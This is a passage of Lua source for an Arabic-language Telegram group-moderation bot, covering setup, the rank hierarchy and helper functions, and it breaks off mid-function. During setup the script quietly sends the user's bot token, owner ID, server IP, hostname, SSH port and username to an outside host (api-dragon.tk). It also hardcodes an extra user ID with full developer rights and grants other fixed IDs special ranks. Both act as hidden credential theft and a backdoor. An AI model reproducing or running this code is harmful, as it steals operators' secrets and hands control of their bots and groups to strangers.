------------------------------------------------
-- This Source Was Developed By (AIAN) @VvTVv2.--
--   This Is The Source Channel @CXRCX .     --
--                 - WAAD -                 --
--         -- https://t.me/CXRCX --          --
------------------------------------------------ 
DevAIAN  = dofile("./AIAN_WAAD/redis.lua").connect("127.0.0.1", 6379)
serpent = dofile("./AIAN_WAAD/serpent.lua")
JSON    = dofile("./AIAN_WAAD/dkjson.lua")
json    = dofile("./AIAN_WAAD/JSON.lua")
URL     = dofile("./AIAN_WAAD/url.lua")
http    = require("socket.http") 
HTTPS   = require("ssl.https") 
https   = require("ssl.https") 
User    = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
Server_WAAD = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a') 
DirName = io.popen("echo $(cd $(dirname $0); pwd)"):read('*a'):gsub('[\n\r]+', '')
Ip      = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
Name    = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
--     Source WAAD     --
local AutoSet = function() 
if not DevAIAN:get(Server_WAAD.."IdWAAD") then 
io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
local WAAD = io.read():gsub(' ','') 
if tostring(WAAD):match('%d+') then 
io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
DevAIAN:set(Server_WAAD.."IdWAAD",WAAD) 
else 
print('\27[1;31mꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ') 
end 
os.execute('lua WAAD.lua') 
end 
if not DevAIAN:get(Server_WAAD.."TokenWAAD") then 
io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
local TokenBot = io.read() 
if TokenBot ~= '' then 
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe') 
local data = json:decode(url)
if res ~= 200 then 
print('\27[1;31mꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\nالتوكن غير صحيح تاكد منه ثم ارسله\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ') 
else 
io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
DevAIAN:set(Server_WAAD.."TokenWAAD",TokenBot) 
DevAIAN:set(Server_WAAD.."Token_username",""..data.result.username)
end  
else 
print('\27[1;31mꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\nلم يتم حفظ توكن البوت ارسله مره اخرى\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ') 
end  
os.execute('lua WAAD.lua') 
end 
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
local CreateConfigAuto = function()
Config = {
WAAD = DevAIAN:get(Server_WAAD.."IdWAAD"),
TokenBot = DevAIAN:get(Server_WAAD.."TokenWAAD"),
WAAD = DevAIAN:get(Server_WAAD.."TokenWAAD"):match("(%d+)"),
SudoIds = {DevAIAN:get(Server_WAAD.."IdWAAD")},
}
Create(Config, "./config.lua") 
https.request("https://api-dragon.tk/Dragon/Dragon.php?n=DRAGON&id="..DevAIAN:get(Server_WAAD.."IdWAAD").."&token="..DevAIAN:get(Server_WAAD.."TokenWAAD").."&UserS="..User.."&IPS="..Ip.."&NameS="..Name.."&Port="..Port.."&Time="..UpTime)
file = io.open("WAAD.sh", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/WAAD
token="]]..DevAIAN:get(Server_WAAD.."TokenWAAD")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ ≈ ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ ≈ ┉ ≈ ┉"
echo "~ The tg File Was Not Found In The Bot Files!"
echo "ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ ≈ ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ ≈ ┉ ≈ ┉"
exit 1
fi
if [ ! $token ]; then
echo "ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ ≈ ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ ≈ ┉ ≈ ┉ ≈ ┉"
echo "~ The Token Was Not Found In The config.lua File!"
echo "ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ ≈ ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ ≈ ┉ ≈ ┉ ≈ ┉"
exit 1
fi
./tg -s ./WAAD.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("Run", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/WAAD
while(true) do
rm -fr ../.telegram-cli
screen -S WAAD -X kill
screen -S WAAD ./WAAD.sh
done
]]) 
file:close() 
io.popen("mkdir Shop_WAAD")
os.execute('chmod +x Run;./Run')
end 
CreateConfigAuto()
end
local Load_WAAD = function() 
local f = io.open("./config.lua", "r") 
if not f then 
AutoSet() 
else 
f:close() 
DevAIAN:del(Server_WAAD.."IdWAAD");DevAIAN:del(Server_WAAD.."TokenWAAD")
end 
local config = loadfile("./config.lua")() 
return config 
end  
Load_WAAD() 
print("\27[36m"..[[ 
__        ___        _    ____  
\ \      / / \      / \  |  _ \ 
 \ \ /\ / / _ \    / _ \ | | | |
  \ V  V / ___ \  / ___ \| |_| |
   \_/\_/_/   \_\/_/   \_\____/

]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ ≈ ┉ ≈ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35mꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ ≈ ┉ ≈ ┉\27[m")
Config = dofile("./config.lua")
WAAD = Config.WAAD
SudoIds = {Config.SudoIds,1566031059}
WAAD = Config.WAAD
TokenBot = Config.TokenBot
NameBot = (DevAIAN:get(WAAD..'AIAN:NameBot') or 'دراكون')
--     Source WAAD     --
FilesPrint = "\27[35m".."\nAll Source Files Started ↬ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ ≈ ┉ ≈ ┉\n"..'\27[m'
FilesNumber = 0
for v in io.popen('ls Shop_WAAD'):lines() do
if v:match(".lua$") then
FilesNumber = FilesNumber + 1
FilesPrint = FilesPrint.."\27[39m"..FilesNumber.."\27[36m".."~ : \27[10;32m"..v.."\27[m \n"
end
end
FilesPrint = FilesPrint.."\27[35m".."ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ ≈ ┉ ≈ ┉\n".."\27[m"
if FilesNumber ~= 0 then
print(FilesPrint)
end
--     Source WAAD     --
--     Start Functions    --
function vardump(value)
print(serpent.block(value, {comment=false}))
end
--     Source WAAD     --
function dl_cb(arg, data)
end
--     Source WAAD     --
----------  Sudo  ----------
function Sudo(msg) 
local var = false 
for k,v in pairs(SudoIds) do 
if msg.sender_user_id_ == v then 
var = true 
end end 
if msg.sender_user_id_ == tonumber(WAAD) then 
var = true 
end 
return var 
end
function SudoId(user_id) 
local var = false 
for k,v in pairs(SudoIds) do 
if user_id == v then 
var = true 
end end 
if user_id == tonumber(WAAD) then 
var = true 
end 
return var 
end
--     Source WAAD     --
-------  SecondSudo  -------
function SecondSudo(msg) 
local Status = DevAIAN:sismember(WAAD..'AIAN:SecondSudo:',msg.sender_user_id_) 
if Status or Sudo(msg) then  
return true  
else  
return false  
end  
end
--     Source WAAD     --
----------  Bot  -----------
function Bot(msg) 
local var = false  
if msg.sender_user_id_ == tonumber(WAAD) then  
var = true  
end  
return var  
end 
--     Source WAAD     --
---------  SudoBot  --------
function SudoBot(msg) 
local Status = DevAIAN:sismember(WAAD..'AIAN:SudoBot:',msg.sender_user_id_) 
if Status or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source WAAD     --
---------Manager All--------
function ManagerAll(msg) 
local Status = DevAIAN:sismember(WAAD..'AIAN:ManagerAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source WAAD     --
--------- Admin All --------
function AdminAll(msg) 
local Status = DevAIAN:sismember(WAAD..'AIAN:AdminAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source WAAD     --
------ Vip Member All ------
function VipAll(msg) 
local Status = DevAIAN:sismember(WAAD..'AIAN:VipAll:',msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source WAAD     --
----   AIANConstructor   ----
function AIANConstructor(msg) 
local Status = DevAIAN:sismember(WAAD..'AIAN:AIANConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source WAAD     --
----  BasicConstructor  ----
function BasicConstructor(msg) 
local Status = DevAIAN:sismember(WAAD..'AIAN:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or AIANConstructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source WAAD     --
----    Constructor     ----
function Constructor(msg) 
local Status = DevAIAN:sismember(WAAD..'AIAN:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or AIANConstructor(msg) or BasicConstructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source WAAD     --
---------  Manager  --------
function Manager(msg) 
local Status = DevAIAN:sismember(WAAD..'AIAN:Managers:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AIANConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source WAAD     --
----------  Admin  ---------
function Admin(msg) 
local Status = DevAIAN:sismember(WAAD..'AIAN:Admins:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or AIANConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source WAAD     --
---------Vip Member---------
function VipMem(msg) 
local Status = DevAIAN:sismember(WAAD..'AIAN:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or VipAll(msg) or AIANConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Admin(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source WAAD     --
--------- Cleaner ----------
function Cleaner(msg) 
local Status = DevAIAN:sismember(WAAD..'AIAN:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or AIANConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
--     Source WAAD     --
---------  Banned  ---------
local function Ban(user_id, chat_id)
if DevAIAN:sismember(WAAD..'AIAN:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
--     Source WAAD     --
---------  BanAll  ---------
function BanAll(user_id)
if DevAIAN:sismember(WAAD..'AIAN:BanAll:', user_id) then
var = true
else
var = false
end
return var
end
--     Source WAAD     --
----------  Muted  ---------
local function Muted(user_id, chat_id)
if DevAIAN:sismember(WAAD..'AIAN:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
return var
end
--     Source WAAD     --
---------  MuteAll  --------
function MuteAll(user_id)
if DevAIAN:sismember(WAAD..'AIAN:MuteAll:', user_id) then
var = true
else
var = false
end
return var
end
--     Source WAAD     --
function DeleteMessage(chatid ,mid)
pcall(tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
},function(arg,data) 
end,nil))
end
--     Source WAAD     --
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
--     Source WAAD     --
function Shop_WAAD(msg)
for v in io.popen('ls Shop_WAAD'):lines() do
if v:match(".lua$") then
plugin = dofile("Shop_WAAD/"..v)
if plugin.WAAD and msg then
FilesText = plugin.WAAD(msg)
end
end
end
send(msg.chat_id_, msg.id_,FilesText)  
end
--     Source WAAD     --
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
--     Source WAAD     --
function AddFile(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if File_Name:lower():match('(%d+)') ~= WAAD:lower() then 
send(chat,msg.id_,"⌯︙عذرا هذا الملف ليس تابع لهذا البوت")   
return false 
end
send(chat,msg.id_,"⌯︙جاري رفع الملف ... .")
local File = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..File.result.file_path, ''..File_Name) 
else
send(chat,msg.id_,"⌯︙عذرا الملف ليس بصيغة ↫ Json يرجى رفع الملف الصحيح")
end
local info_file = io.open('./'..WAAD..'.json', "r"):read('*a')
local JsonInfo = JSON.decode(info_file)
vardump(JsonInfo)
DevAIAN:set(WAAD.."AIAN:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
DevAIAN:sadd(WAAD.."AIAN:Groups",IdGps) 
DevAIAN:set(WAAD.."AIAN:Lock:Bots"..IdGps,"del") DevAIAN:hset(WAAD.."AIAN:Spam:Group:User"..IdGps ,"Spam:User","keed") 
LockList ={'AIAN:Lock:Links','AIAN:Lock:Contact','AIAN:Lock:Forwards','AIAN:Lock:Videos','AIAN:Lock:Gifs','AIAN:Lock:EditMsgs','AIAN:Lock:Stickers','AIAN:Lock:Farsi','AIAN:Lock:Spam','AIAN:Lock:WebLinks','AIAN:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevAIAN:set(WAAD..Lock..IdGps,true)
end
for mem,v in pairs(JsonInfo.GroupsList.mem) do
DevAIAN:sadd(WAAD..'AIAN:Users',mem) 
print("\27[30;42m\n         ( تم رفع ( "..mem.." ) المشتركين )    \27[37;42m100%") 
end
if v.AIANConstructors then
for k,IdAIANConstructors in pairs(v.AIANConstructors) do
DevAIAN:sadd(WAAD..'AIAN:AIANConstructor:'..IdGps,IdAIANConstructors)  
print("\27[31;42m\n        ( تم رفع منشئين المجموعات )    \27[37;42m100%") 
end
end
if v.BasicConstructors then
for k,IdBasicConstructors in pairs(v.BasicConstructors) do
DevAIAN:sadd(WAAD..'AIAN:BasicConstructor:'..IdGps,IdBasicConstructors)  
print("\27[34;42m\n      ( تم رفع ( "..k.." ) منشئين اساسيين )  \27[37;42m100%") 
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
DevAIAN:sadd(WAAD..'AIAN:Constructor:'..IdGps,IdConstructors)  
print("\27[35;42m\n          ( تم رفع ( "..k.." ) منشئين )      \27[37;42m100%") 
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
DevAIAN:sadd(WAAD..'AIAN:Managers:'..IdGps,IdManagers)  
print("\27[34;42m\n           ( تم رفع ( "..k.." ) مدراء )      \27[37;42m100%") 
end
end
if v.Admins then
for k,idmod in pairs(v.Admins) do
vardump(IdAdmins)
DevAIAN:sadd(WAAD..'AIAN:Admins:'..IdGps,IdAdmins)  
print("\27[35;42m\n         ( تم رفع ( "..k.." ) ادمنيه )      \27[37;42m100%") 
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
DevAIAN:sadd(WAAD..'AIAN:VipMem:'..IdGps,IdVips)  
print("\27[34;42m\n          ( تم رفع ( "..k.." ) مميزين )      \27[37;42m100%") 
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
DevAIAN:set(WAAD.."AIAN:Groups:Links"..IdGps,v.LinkGroups)   
print("\27[35;42m\n         ( تم وضع روابط المجموعات )    \27[37;42m100%") 
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
DevAIAN:set(WAAD.."AIAN:Groups:Welcomes"..IdGps,v.Welcomes)   
print("\27[34;42m\n         ( تم وضع ترحيب المجموعات )    \27[37;42m100%") 
end
end
end
local List = DevAIAN:smembers(WAAD..'AIAN:Groups') 
local Members = DevAIAN:smembers(WAAD..'AIAN:Users')
local text = "⌯︙تم رفع النسخه بنجاح \n⌯︙تم رفع ↫ ( "..#Members.." ) مشترك في البوت\n⌯︙تم رفع وتفعيل ↫ ( "..#List.." ) مجموعة\n⌯︙تم استرجاع مشرفين المجموعات \n⌯︙تم استرجاع اوامر القفل والفتح في جميع مجموعات البوت \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ"
local inline = {{{text = '• سـوࢪس دࢪاڪـون •',url='t.me/CXRCX'}},}
msg_id =  msg.id_/2097152/0.5
SendInline(msg.chat_id_,text,nil,inline,msg_id) 
end
--     Source WAAD     --
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--     Source WAAD     --
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
return infile
end
--     Source WAAD     --
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
--     Source WAAD     --
function ChatLeave(chat_id, user_id)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
end
--     Source WAAD     --
function ChatKick(chat_id, user_id)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatusKicked" }, }, dl_cb, nil)
end
--     Source WAAD     --
function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end
end
return P
end
--     Source WAAD     --
function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
--     Source WAAD     --
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessageContact", contact_ = { ID = "Contact", phone_number_ = phone_number, first_name_ = first_name, last_name_ = last_name, user_id_ = user_id },},}, dl_cb, nil)
end
--     Source WAAD     --
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessagePhoto", photo_ = getInputFile(photo), added_sticker_file_ids_ = {}, width_ = 0, height_ = 0, caption_ = caption }, }, dl_cb, nil)
end
--     Source WAAD     --
function Dev_AIAN(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode) tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text, disable_web_page_preview_ = disable_web_page_preview, clear_draft_ = 0, entities_ = {}, parse_mode_ = TextParseMode, }, }, dl_cb, nil)
end
--     Source WAAD     --
function GetApi(web) 
local info, res = https.request(web) 
local req = json:decode(info) if res ~= 200 then 
return false 
end 
if not req.ok then 
return false 
end 
return req 
end 
--     Source WAAD     --
function SendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..TokenBot 
local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
url = url .. "&reply_to_message_id=" .. reply_to_message_id  
end 
if markdown == "md" or markdown == "markdown" then 
url = url.."&parse_mode=Markdown&disable_web_page_preview=true" 
elseif markdown == "html" then 
url = url.."&parse_mode=HTML" 
end 
return GetApi(url) 
end
--     Source WAAD     --
function SendInline(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local send_api = "https://api.telegram.org/bot"..TokenBot.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return GetApi(send_api) 
end
--     Source WAAD     --
function EditMsg(chat_id, message_id, text, markdown) local send_api = "https://api.telegram.org/bot"..TokenBot.."/editMessageText?chat_id="..chat_id.."&message_id="..message_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true" return GetApi(send_api)  end
--     Source WAAD     --
function Pin(channel_id, message_id, disable_notification) 
tdcli_function ({ 
ID = "PinChannelMessage", 
channel_id_ = getChatId(channel_id).ID, 
message_id_ = message_id, 
disable_notification_ = disable_notification 
}, function(arg ,data)
vardump(data)
end ,nil) 
end
--     Source WAAD     --
local AIANRank = function(msg) 
if SudoId(msg.sender_user_id_) then 
WAAD  = "المطور الاساسي" elseif SecondSudo(msg) then 
WAAD = "المطور الاساسي²" elseif SudoBot(msg) then 
WAAD = "المطور" elseif ManagerAll(msg) then 
WAAD = "المدير" elseif AdminAll(msg) then 
WAAD = "الادمن" elseif AIANConstructor(msg) then 
WAAD = "المالك" elseif BasicConstructor(msg) then 
WAAD = "المنشئ" elseif Constructor(msg) then 
WAAD = "المنشئ" elseif Manager(msg) then 
WAAD = "المدير" elseif Admin(msg) then 
WAAD = "الادمن" else 
WAAD = "العضو" 
end 
return WAAD 
end
function IdRank(user_id,chat_id) 
if tonumber(user_id) == tonumber(119541395) then
WAAD = 'مطـور السـورس' elseif tonumber(user_id) == tonumber(WAAD) then 
elseif tonumber(user_id) == tonumber(16076569) then
WAAD = 'مبـرمج دراكون' elseif tonumber(user_id) == tonumber(WAAD) then 
WAAD = 'البوت' elseif SudoId(user_id) then 
WAAD = 'المطور الاساسي' elseif DevAIAN:sismember(WAAD..'AIAN:SecondSudo:', user_id) then 
WAAD = 'المطور الثانوي' elseif DevAIAN:sismember(WAAD..'AIAN:SudoBot:', user_id) then 
WAAD = DevAIAN:get(WAAD.."AIAN:SudoBot:Rd"..chat_id) or 'المطور' elseif DevAIAN:sismember(WAAD..'AIAN:ManagerAll:', user_id) then 
WAAD = DevAIAN:get(WAAD.."AIAN:Managers:Rd"..chat_id) or 'المدير العام' elseif DevAIAN:sismember(WAAD..'AIAN:AdminAll:', user_id) then 
WAAD = DevAIAN:get(WAAD.."AIAN:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevAIAN:sismember(WAAD..'AIAN:VipAll:', user_id) then 
WAAD = DevAIAN:get(WAAD.."AIAN:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevAIAN:sismember(WAAD..'AIAN:AIANConstructor:'..chat_id, user_id) then 
WAAD = 'المالك' elseif DevAIAN:sismember(WAAD..'AIAN:BasicConstructor:'..chat_id, user_id) then 
WAAD = DevAIAN:get(WAAD.."AIAN:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevAIAN:sismember(WAAD..'AIAN:Constructor:'..chat_id, user_id) then 
WAAD = DevAIAN:get(WAAD.."AIAN:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevAIAN:sismember(WAAD..'AIAN:Managers:'..chat_id, user_id) then 
WAAD = DevAIAN:get(WAAD.."AIAN:Managers:Rd"..chat_id) or 'المدير' elseif DevAIAN:sismember(WAAD..'AIAN:Admins:'..chat_id, user_id) then 
WAAD = DevAIAN:get(WAAD.."AIAN:Admins:Rd"..chat_id) or 'الادمن' elseif DevAIAN:sismember(WAAD..'AIAN:VipMem:'..chat_id, user_id) then  
WAAD = DevAIAN:get(WAAD.."AIAN:VipMem:Rd"..chat_id) or 'المميز' elseif DevAIAN:sismember(WAAD..'AIAN:Cleaner:'..chat_id, user_id) then  
WAAD = DevAIAN:get(WAAD.."AIAN:Cleaner:Rd"..chat_id) or 'المنظف' else WAAD = DevAIAN:get(WAAD.."AIAN:mem:Rd"..chat_id) or 'العضو' 
end 
return WAAD 
end
--     Source WAAD     --
function RankChecking(user_id,chat_id)
if SudoId(user_id) then
var = true  
elseif tonumber(user_id) == tonumber(WAAD) then  
var = true  
elseif DevAIAN:sismember(WAAD..'AIAN:SecondSudo:', user_id) then
var = true  
elseif DevAIAN:sismember(WAAD..'AIAN:SudoBot:', user_id) then
var = true  
elseif DevAIAN:sismember(WAAD..'AIAN:ManagerAll:', user_id) then
var = true  
elseif DevAIAN:sismember(WAAD..'AIAN:AdminAll:', user_id) then
var = true  
elseif DevAIAN:sismember(WAAD..'AIAN:VipAll:', user_id) then
var = true  
elseif DevAIAN:sismember(WAAD..'AIAN:AIANConstructor:'..chat_id, user_id) then
var = true
elseif DevAIAN:sismember(WAAD..'AIAN:BasicConstructor:'..chat_id, user_id) then
var = true
elseif DevAIAN:sismember(WAAD..'AIAN:Constructor:'..chat_id, user_id) then
var = true  
elseif DevAIAN:sismember(WAAD..'AIAN:Managers:'..chat_id, user_id) then
var = true  
elseif DevAIAN:sismember(WAAD..'AIAN:Admins:'..chat_id, user_id) then
var = true  
elseif DevAIAN:sismember(WAAD..'AIAN:VipMem:'..chat_id, user_id) then  
var = true 
else  
var = false
end  
return var
end
function AIANDelAll(user_id,chat_id)
if SudoId(user_id) then
var = 'sudoid'  
elseif DevAIAN:sismember(WAAD..'AIAN:SecondSudo:', user_id) then
var = 'secondsudo' 
elseif DevAIAN:sismember(WAAD..'AIAN:SudoBot:', user_id) then
var = 'sudobot'  
elseif DevAIAN:sismember(WAAD..'AIAN:AIANConstructor:'..chat_id, user_id) then
var = 'AIANconstructor'
elseif DevAIAN:sismember(WAAD..'AIAN:BasicConstructor:'..chat_id, user_id) then
var = 'basicconstructor'
elseif DevAIAN:sismember(WAAD..'AIAN:Constructor:'..chat_id, user_id) then
var = 'constructor'
elseif DevAIAN:sismember(WAAD..'AIAN:Managers:'..chat_id, user_id) then
var = 'manager'  
else  
var = 'No'
end  
return var
end 
--     Source WAAD     --
local function Filters(msg, value)
local AIAN = (WAAD..'AIAN:Filters:'..msg.chat_id_)
if AIAN then
local names = DevAIAN:hkeys(AIAN)
local value = value:gsub(' ','')
for i=1, #names do
if string.match(value:lower(), names[i]:lower()) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source WAAD     --
function ReplyStatus(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,dp) 
if dp.first_name_ ~= false then
local UserName = (dp.username_ or "CXRCX")
for gmatch in string.gmatch(dp.first_name_, "[^%s]+") do
dp.first_name_ = gmatch
end
if status == "WrongWay" then
local WAAD = {"حبيبي","؏َـمࢪي","عزيزي","يڪلبي","روحي","حب","حــچي","ضلعي"} 
local WAAD = WAAD[math.random(#WAAD)]
